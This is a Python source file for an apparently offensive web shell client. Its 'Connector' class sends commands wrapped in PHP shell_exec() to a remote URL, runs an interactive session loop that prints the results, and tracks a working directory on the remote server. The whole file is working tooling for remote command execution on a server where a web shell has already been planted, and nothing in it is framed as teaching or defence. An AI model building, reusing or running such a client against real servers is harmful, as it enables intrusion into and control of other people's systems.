import requests
import os
from termcolor import colored
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
class Connector:
    def __init__(self,url,password):
        self.url = url
        self.password = password
        self.content = ""
        self.data = {"cmd":"ls"}
        self.current_path = "/" #webshell中的路径


    def connect(self):
        if requests.post(self.url).status_code == 200:
            print(f"{colored("[+]","blue",attrs=["bold"])} Connected to {colored(self.url,"green",attrs=["underline"])} !")
            while True:
                remote_cmd = input("[Session] > ")
                self.execute(remote_cmd)
        else:
            print(f"{colored("[-]","red",attrs=["bold"])} Connection to {colored(self.url,"red",attrs=["underline"])} failed.")

    def execute(self,cmd):
        cmd = f"shell_exec('{cmd}')"
        res = requests.post(self.url, {"cmd": f"echo {cmd};"})
        print(res.text)

    def change_dir(self,new_path):
        if not new_path.startswith("/"):
            target_path = os.path.normpath(os.path.join(self.current_path, new_path))
        else:
            target_path = new_path

        test_cmd = f"cd {target_path} && pwd"
        payload = {"cmd": f"shell_exec('{test_cmd}')"}
        res = requests.post(self.url, payload)
        output = res.text.strip()

        if output and output.startswith("/"):
            self.current_path = output
            self.prompt_path = self.current_path
        else:
            print(colored("[-] Invalid directory", "red"))

    def get_initial_path(self):
        payload = {"cmd": "shell_exec('pwd')"}
        res = requests.post(self.url, payload)
        path = res.text.strip()
        return path if path else "/"